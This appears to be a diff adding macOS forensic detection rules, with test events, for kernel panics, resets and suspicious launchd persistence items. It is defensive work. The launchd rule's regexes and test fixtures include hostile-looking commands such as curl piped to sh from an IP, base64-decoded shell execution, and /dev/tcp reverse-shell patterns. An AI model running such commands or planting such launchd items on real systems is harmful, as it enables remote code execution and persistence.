@@ -1,0 +1,99 @@
+# Rules for artifacts that the forensic triage reads from a Mac: the reports of the crash reporter
+# (/Library/Logs/DiagnosticReports) and the property lists of launchd. Each event has product macos,
+# category forensics and a service that names the kind of artifact.
+# A hit says "look at this", not "this is an attack".
+title: The Mac had a kernel panic
+name: forensics_macos_kernel_panic
+id: 7b2d4e60-0201-4c1a-8e5f-1a2b3c4d5e01
+description: A panic report is in /Library/Logs/DiagnosticReports. The Mac stopped and started again. Most panics come from a driver, a kernel extension, a peripheral or the hardware; the panic text names the part that failed.
+level: medium
+logsource: {product: macos, category: forensics, service: diagnostic_report}
+detection:
+  selection: {action: kernel_panic}
+  condition: selection
+tests:
+  - name: a panic report matches
+    events: [{product: macos, category: forensics, service: diagnostic_report, action: kernel_panic, panic: "panic(cpu 4 caller 0xfffffe002b9c1a3c): watchdog timeout: no checkins from watchdogd in 90 seconds"}]
+    expect: {alerts: 1}
+  - name: a crash of a program does not
+    events: [{product: macos, category: forensics, service: diagnostic_report, action: crash, process: Safari}]
+    expect: {alerts: 0}
+---
+title: The Mac was reset with the power button
+name: forensics_macos_button_reset
+id: 7b2d4e60-0202-4c1a-8e5f-1a2b3c4d5e02
+description: A ResetCounter report says that the last start came after a reset by the power button (held down, or the key sequence for a reset). The system did not shut down, so the unified log ends without a shutdown and goes on with the next start. Someone pressed the button, most often because the Mac did not answer. Ask who was at the Mac; if nobody was, look at what ran just before.
+level: low
+logsource: {product: macos, category: forensics, service: diagnostic_report}
+detection:
+  selection: {action: reset, reset_kind: power_button}
+  condition: selection
+tests:
+  - name: a reset by the button matches
+    events: [{product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: power_button, boot_faults: "rst btn_rst,btn_seq_reset target_off_restart"}]
+    expect: {alerts: 1}
+  - name: a reset by the watchdog is another rule
+    events: [{product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: watchdog}]
+    expect: {alerts: 0}
+---
+title: The Mac was reset without the power button
+name: forensics_macos_unexpected_reset
+id: 7b2d4e60-0203-4c1a-8e5f-1a2b3c4d5e03
+description: A ResetCounter report says that the last start came after a reset that nobody asked for, by the watchdog (the system hung) or by another fault. Look for a panic report and at what the unified log shows just before.
+level: medium
+logsource: {product: macos, category: forensics, service: diagnostic_report}
+detection:
+  selection:
+    action: reset
+    reset_kind: [watchdog, panic, other]
+  condition: selection
+tests:
+  - name: watchdog and other resets match
+    events:
+      - {product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: watchdog, boot_faults: "wdog,reset_in1"}
+      - {product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: other, boot_faults: "sys_thermal"}
+    expect: {alerts: 2}
+  - name: a reset by the button or with no faults does not
+    events:
+      - {product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: power_button}
+      - {product: macos, category: forensics, service: diagnostic_report, action: reset, reset_kind: unknown}
+    expect: {alerts: 0}
+---
+title: A launchd item starts something that does not belong in a service
+name: forensics_launchd_suspicious_program
+id: 7b2d4e60-0204-4c1a-8e5f-1a2b3c4d5e04
+description: A LaunchDaemon or LaunchAgent starts a program from a folder that everyone can write (/tmp, /Users/Shared) or from a hidden folder, downloads a script and runs it, runs encoded or inline script code, or opens a shell to the network. LaunchAgents and LaunchDaemons are the most common way for Mac malware to start again after a restart.
+level: high
+tags: [attack.persistence, attack.t1543.001, attack.t1543.004]
+logsource: {product: macos, category: forensics, service: launchd_plist}
+detection:
+  temporary:
+    command|re: '^"?(/bin/(ba|z)?sh\s+(-c\s+)?)?["'']?/(private/)?(tmp|var/tmp|Users/Shared)/\S'
+  hidden:
+    command|re: '^"?/(Users/[^/\s]+|Library|private/var/root)/(\S*/)?\.[^/\s]+/\S'
+  download:
+    command|re|i: '(curl|wget)\b[^|;&]*\|\s*(ba|z)?sh\b'
+  inline:
+    command|re: '\b(osascript\s+(-l\s+\S+\s+)?-e|python3?\s+-c|perl\s+-e|ruby\s+-e)\b'
+  encoded:
+    command|re: 'base64\s+(-d|-D|--decode)\b'
+  shell:
+    command|re: '-i\b[^|;]*>&?\s*/dev/tcp/'
+  condition: 1 of them
+tests:
+  - name: items that need a look
+    events:
+      - {product: macos, category: forensics, service: launchd_plist, label: com.apple.updates, command: "/Users/Shared/.local/update --daemon"}
+      - {product: macos, category: forensics, service: launchd_plist, label: com.google.keystone.agent, command: "/Users/aiko/Library/.hidden/agent"}
+      - {product: macos, category: forensics, service: launchd_plist, label: helper, command: "/bin/sh -c \"curl -s http://203.0.113.80/a | sh\""}
+      - {product: macos, category: forensics, service: launchd_plist, label: helper2, command: "/usr/bin/osascript -e \"do shell script \\\"id\\\"\""}
+      - {product: macos, category: forensics, service: launchd_plist, label: helper3, command: "/bin/bash -c \"echo aWQ= | base64 -D | bash\""}
+      - {product: macos, category: forensics, service: launchd_plist, label: helper4, command: "/private/tmp/x"}
+      - {product: macos, category: forensics, service: launchd_plist, label: helper5, command: "/usr/bin/osascript -l JavaScript -e \"ObjC.import('stdlib')\""}
+    expect: {alerts: 7}
+  - name: ordinary items
+    events:
+      - {product: macos, category: forensics, service: launchd_plist, label: com.docker.vmnetd, command: /Library/PrivilegedHelperTools/com.docker.vmnetd}
+      - {product: macos, category: forensics, service: launchd_plist, label: homebrew.mxcl.postgresql@16, command: "/opt/homebrew/opt/postgresql@16/bin/postgres -D /opt/homebrew/var/postgresql@16"}
+      - {product: macos, category: forensics, service: launchd_plist, label: com.example.backup, command: "/usr/local/bin/backup --scratch /tmp/backup"}
+    expect: {alerts: 0}
